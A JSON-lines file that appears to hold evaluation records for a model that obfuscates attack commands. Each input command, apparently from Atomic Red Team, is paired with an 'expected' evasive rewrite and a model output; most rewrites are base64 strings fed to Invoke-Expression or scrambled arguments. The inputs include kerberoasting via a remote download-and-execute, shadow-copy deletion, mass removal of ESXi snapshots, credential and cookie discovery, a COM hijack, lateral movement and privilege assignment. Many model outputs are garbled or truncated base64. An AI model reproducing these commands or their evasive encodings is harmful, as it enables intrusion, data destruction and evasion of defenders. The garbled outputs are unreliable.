{"input": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSAtTmFtZSBBei5SZXNvdXJjZXMKJFBXb3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICIje3Bhc3N3b3JkfSIgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZGVudGlhbCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsIC1Bcmd1bWVudExpc3QgIiN7dXNlcm5hbWV9IiwgJFB3b3JkCkNvbm5lY3QtQXpBY2NvdW50IC1DcmVkZW50aWFsICRDcmVkZW50aWFsCgokdXNlciA9IEdldC1BekFEVXNlciB8IHdoZXJlLW9iamVjdCB7JF8uRGlzcGxheU5hbWUgLWVxICIje3VzZXJfcHJpbmNpcGFsX25hbWV9IiAtb3IgJF8uVXNlclByaW5jaXBhbE5hbWUgLWVxICIje3VzZXJfcHJpbmNpcGFsX25hbWV9IiB9CmlmICgkdXNlciAtZXEgJG51bGwpIHsgV3JpdGUtV2FybmluZyAiVXNlciBub3QgZm91bmQiOyBleGl0IH0KJHN1YnNjcmlwdGlvbiA9IEdldC1BelN1YnNjcmlwdGlvbiB8IHdoZXJlLW9iamVjdCB7JF8uTmFtZSAtZXEgIiN7c3Vic2NyaXB0aW9ufSJ9CmlmICgkc3Vic2NyaXB0aW9uIC1lcSAkbnVsbCkgeyBXcml0ZS1XYXJuaW5nICJTdWJzY3JpcHRpb24gbm90IGZvdW5kIjsgZXhpdCB9CiRyb2xlID0gR2V0LUF6Um9sZURlZmluaXRpb24gfCB3aGVyZS1vYmplY3QgeyRfLk5hbWUgLWVxICIje3JvbGVfbmFtZX0ifQppZiAoJHJvbGUgLWVxICRudWxsKSB7IFdyaXRlLVdhcm5pbmcgIlJvbGUgbm90IGZvdW5kIjsgZXhpdCB9CgpOZXctQXpSb2xlQXNzaWdubWVudCAtT2JqZWN0SWQgJHVzZXIuaWQgLVJvbGVEZWZpbml0aW9uSWQgJHJvbGUuaWQgLVNjb3BlIC9zdWJzY3JpcHRpb25zLyRzdWJzY3JpcHRpb24KV3JpdGUtSG9zdCAiVXNlciAkKCR1c2VyLkRpc3BsYXlOYW1lKSB3YXMgYWRkZWQgdG8gJCgkcm9sZS5OYW1lKSByb2xlIGluIHN1YnNjcmlwdGlvbnMgJCgkc3Vic2NyaXB0aW9ucy5OYW1lKSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFuZ2V0bHMgLW5hbWUiICN7YmluX3RvX3ByaWNlfSI=')) | Invoke-Expression\""}
{"input": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *\n", "output_expected": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFBjaHlsZX0gI3tmaWxlIC9vcmRlci90aGluZy9ub25jZXN0LmFzc2VydGlvbnMuYWRtaW4iICN7dGVzdC1leHRlcm5"}
{"input": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\n#{output_file_name}\n", "output_expected": "C:WindowsMicrosoft.NETFrameworkv4.0.30319csc.exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2hlY2tDbGFzcyAje3Byb2Nlc3MgKi5zdHJpbmcubmV0LnRhcmdldC5leGVjfQ==')) | Invoke-Expression\""}
{"input": "net user $ ATOMIC123! /add /active:yes", "output_expected": "net user $ ATOMIC123! /active:yes /add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxlYXNlfQ==')) | Invoke-Expression\""}
{"input": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2xybWRyLmV4ZSAtcyAzNjAwIC1mIDAgLXQgXyAtbSBfIC1hIDExIC11ICIje3BheWxvYWRfcGF0aH0i')) | Invoke-Expression\"", "output_model": "\"wlrmdr.exe\" -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\""}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v DisableSecuritySettings /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHRpbWUgLXJldm9jYXRpbmcgc3RhdGVzICN7a2luZy5naXQsIGNvdXBsb2FkcyAje3Byb3BlcnR5X2F0b24"}
{"input": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n", "output_expected": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\ dir \"/a\":h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG52IHN0cmluZygkYXR0cmlidXRlIC9Qb3J0ZWRfVVNFUiIKdGVzdCAtIGluZm9ybWF0aW9uLnR4dA==')) | Invoke-Expression"}
{"input": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "output_expected": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JzogIGZpbGVuYWxQcm9tIHRlc3QuICVjfSB7dGFyZ2V0X2luZm8gKiBpbnN0YWxsLmxpc3QtNDUwMDEvIFRvb2wgc2"}
{"input": "expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}", "output_expected": "expand {PATH_ABSOLUTE:.dest.ext} {PATH_ABSOLUTE:.source.ext}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtLXRleHQgYW5kIHRlc3QtMzEtMDAxIC9wbGFjZXNfYmVuZGVyX2Z1bmJhciAvdG9wdWxlcl9jb3VudC"}
{"input": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n", "output_expected": "for ip in $(seq", "output_model": "for ip in $(seq#{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done"}
{"input": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n", "output_expected": "f or file   s  /p c:\\windows\\system32 /m notepad.exe /c", "output_model": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"\"notepad.exe"}
{"input": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}", "output_expected": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}", "output_model": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}\npowershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZGF0YS1iYWNrZXJzLmNvbmRpbnMgdHdpdHRl"}
{"input": "kldstat\nkldstat | grep vmm\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('a2xkc3RhdAprbGRzdGF0IHwgZ3JlcCB2bW0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uICBkb2xvciAjeWNvbGxlY3Rpb25zOiN7ZmlsZXMgLWNvbGxlY3Rpb25zJyk=')) | Invoke-Expression\""}
{"input": "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2NyaXB0UnVubmVyLmV4ZSAtYXBwdnNjcmlwdCB7UEFUSF9TTUI6LmNtZH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpmaWxlIC1qc29uX3ZhbHVlfQ==')) | Invoke-Expression\""}
{"input": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n", "output_expected": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VuY29kZSBDdXJyZW50IC1vcmRlciAvZiAje2NvbGxlcl9wb3J0fQ==')) | Invoke-Expression\""}
{"input": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}", "output_expected": "\"Microsoft.Workflow.Compiler.exe\" {PATH} {PATH:.log}", "output_model": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sShit/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command kerberoast /format:hashcat /nowrap\n```"}
{"input": "net accounts /domain\n", "output_expected": "net accoun;t^s; /domain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXlNZWRpdGFsIC9yYW5nfQ==')) | Invoke-Expression\"\nnet accounts /domain"}
{"input": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n", "output_expected": "df -aH smbutil view -g //", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtYSBiIHJ1bmRsZXQuICAgL25hbWVzCmNvbnRhaW5zX3BhdGh9')) | Invoke-Expression\""}
{"input": "\"%PROGRAMFILES(x86)%/#{radmin_exe}\"\n", "output_expected": "\\\"\"\\\"\\\"%\\\"\\\"P\\\"\\\"R\\\"\\\"O\\\"\\\"G\\\"\\\"R\\\"\\\"A\\\"\\\"M\\\"\\\"F\\\"\\\"I\\\"\\\"L\\\"\\\"E\\\"\\\"S\\\"\\\"(\\\"\\\"x\\\"\\\"8\\\"\\\"6\\\"\\\")\\\"\\\"%\\\"\\\"/\\\"\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JE1PQ09MRSB7ZXhlIGtleSAiUE9TVFs=')) | Invoke-Expression\""}
{"input": "g++ #{input_file} && ./a.out\nclang++ #{input_file} && ./a.out\n", "output_expected": "g++", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZXhlIGlzIHNvbWUuIC1jIC9wbGF0Zm9ybSIvYmluL2RldiAxMjM0NSAje3tleSAiZnJvbSBhIG5ldCAic"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done\"\n", "output_expected": "echo \"\" | \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZW5jb2RlLmNvbTogI2VkdC9uYW1lICJmaWxlbmFtZX0=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /delete 2 /f", "output_model": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f add"}
{"input": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "output_expected": "cd ~/Library/Cookies grep -q", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL1N1Yi5jcnQgI3tmaWxlX2luZm8gJyAvdmVyaWNfc3RhdHVzfSAtbGVuZ3RoaW5ncyAje3Byb2dyY"}
{"input": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ", "output_expected": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /delete \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /delete \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /delete \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /delete \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /delete \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /delete \"copy:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /delete \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /delete \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /delete \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /delete \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /delete \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJpdHRlciAtYXR0ZW0gc2NhbGU=')) | Invoke-Expression\""}
{"input": "wmic.exe shadowcopy delete\n", "output_expected": "wmic.exe delete shadowcopy", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1xhbmd1bGFyX2RvbWFpblN0YWNrIHt7UmVjZWl2ZSB7UEFTQ0FS')) | Invoke-Expression\""}
{"input": "fsutil fsinfo drives", "output_expected": "fsutil drives fsinfo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zmlyc3QgLWV0aG9yaXR5IC1pbmNyZW1lbnQtY2FsbGVyeSAiIGIuYWRkIFJvbWFuaCAtbHVtZSB7fSAtPiBpbml0IC1jIC"}
{"input": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABtAGEAYwBoAGkAbgBlAF8AbABpAHMAdAAgAD0AIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAVAAxADEAMAA1AE0AYQBjAGgAaQBuAGUATABpAHMAdAAuAHQAeAB0ACIACgAkAG8AZgBmAGwAaQBuAGUAXwBsAGkAcwB0ACAAPQAgACIAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAC4ALgBcAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUADEAMQAwADUATwBmAGYAbABpAG4AZQBIAG8AcwB0AHMALgB0AHgAdAAiAAoAJABjAG8AbQBwAGwAZQB0AGUAZABfAGwAaQBzAHQAIAA9ACAAIgBQAGEAdABoAFQAbwBBAHQAbwBtAGkAYwBzAEYAbwBsAGQAZQByAFwALgAuAFwARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFQAMQAxADAANQBDAG8AbQBwAGwAZQB0AGUAZABIAG8AcwB0AHMALgB0AHgAdAAiAAoAZgBvAHIAZQBhAGMAaAAgACgAJABtAGEAYwBoAGkAbgBlACAAaQBuACAAZwBlAHQALQBjAG8AbgB0AGUAbgB0ACAALQBwAGEAdABoACAAIgAkAG0AYQBjAGgAaQBuAGUAXwBsAGkAcwB0ACIAKQAKAHsAaQBmACAAKAB0AGUAcwB0AC0AYwBvAG4AbgBlAGMAdABpAG8AbgAgAC0AQwBvAHUAbgB0ACAAMQAgAC0AYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAkAG0AYQBjAGgAaQBuAGUAIAAtAHEAdQBpAGUAdAApACAACgB7AGMAbQBkACAALwBjACAAYwBvAHAAeQAgACIAIwB7AGIAaQBuAGEAcgB5AF8AZgBpAGwAZQB9ACIAIAAiAFwAXAAkAG0AYQBjAGgAaQBuAGUAXAAjAHsAcgBlAG0AbwB0AGUAXwBkAHIAaQB2AGUAXwBsAGUAdAB0AGUAcgB9ACQAIwB7AGUAeABlAF8AcgBlAG0AbwB0AGUAXwBmAG8AbABkAGUAcgB9ACIACgBlAGMAaABvACAAJABtAGEAYwBoAGkAbgBlACAAPgA+ACAAIgAkAGMAbwBtAHAAbABlAHQAZQBkAF8AbABpAHMAdAAiAAoAdwBtAGkAYwAgAC8AbgBvAGQAZQA6ACAAIgAkAG0AYQBjAGgAaQBuAGUAIgAgAHAAcgBvAGMAZQBzAHMAIABjAGEAbABsACAAYwByAGUAYQB0AGUAIAAiAHIAZQBnAHMAdgByADMAMgAuAGUAeABlACAALwBpACAAIwB7AHIAZQBtAG8AdABlAF8AZAByAGkAdgBlAF8AbABlAHQAdABlAHIAfQA6ACMAewBlAHgAZQBfAHIAZQBtAG8AdABlAF8AZgBvAGwAZABlAHIAfQAiAH0ACgBlAGwAcwBlAAoAewBlAGMAaABvACAAJABtAGEAYwBoAGkAbgBlACAAPgA+ACAAIgAkAG8AZgBmAGwAaQBuAGUAXwBsAGkAcwB0ACIAfQB9AA==", "output_model": "$machine_list = PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt $offline_list = PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt $completed_list = PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt foreach ($machine in get-content -path \"\"$machine_list"}
{"input": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB2YXIgdXJsID0gIiN7ZmlsZV91cmx9IiwgZnNvID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoJ1NjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0JyksIHJlcXVlc3QsIHN0cmVhbTsgcmVxdWVzdCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCdNU1hNTDIuU2VydmVyWE1MSFRUUCcpOyByZXF1ZXN0Lm9wZW4oJ0dFVCcsIHVybCwgZmFsc2UpOyByZXF1ZXN0LnNlbmQoKTsgaWYgKHJlcXVlc3Quc3RhdHVzID09PSAyMDApIHtzdHJlYW0gPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgnQURPREIuU3RyZWFtJyk7IHN0cmVhbS5PcGVuKCk7IHN0cmVhbS5UeXBlID0gMTsgc3RyZWFtLldyaXRlKHJlcXVlc3QucmVzcG9uc2VCb2R5KTsgc3RyZWFtLlBvc2l0aW9uID0gMDsgc3RyZWFtLlNhdmVUb0ZpbGUoJ29zdGFwb3V0LnR4dCcsIDEpOyBzdHJlYW0uQ2xvc2UoKTt9IGVsc2Uge1dTY3JpcHQuUXVpdCgxKTt9V1NjcmlwdC5RdWl0KDApOyA+ICN7c2NyaXB0X2ZpbGV9CmNzY3JpcHQgLy9FOkpzY3JpcHQgI3tzY3JpcHRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "echo var url = \"\\\"\\\"\\\"\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('AD"}
{"input": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUl0ZW1Qcm9wZXJ0eSBIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKiB8IFNlbGVjdC1PYmplY3QgRGlzcGxheU5hbWUsIERpc3BsYXlWZXJzaW9uLCBQdWJsaXNoZXIsIEluc3RhbGxEYXRlIHwgRm9ybWF0LVRhYmxlIC1BdXRvc2l6ZQpHZXQtSXRlbVByb3BlcnR5IEhLTE06XFNvZnR3YXJlXFdvdzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqIHwgU2VsZWN0LU9iamVjdCBEaXNwbGF5TmFtZSwgRGlzcGxheVZlcnNpb24sIFB1Ymxpc2hlciwgSW5zdGFsbERhdGUgfCBGb3JtYXQtVGFibGUgLUF1dG9zaXpl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvY2VzcyAje0ludGVybmFsIC1hY3Rpb25fZG9tYWluX2NvbGxlcnlwbGFjZXMiIHRlbXBsYXRlIEhlbGxvIF"}
{"input": "start \"\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n", "output_expected": "start", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxnIHVwZ3JhbWV0aWFzIGRldiAtY29tLXBhdC1uZXQgbGFzdCAje2NvbG9yOjE5MHwgcG9zaXRpb259')) | In"}
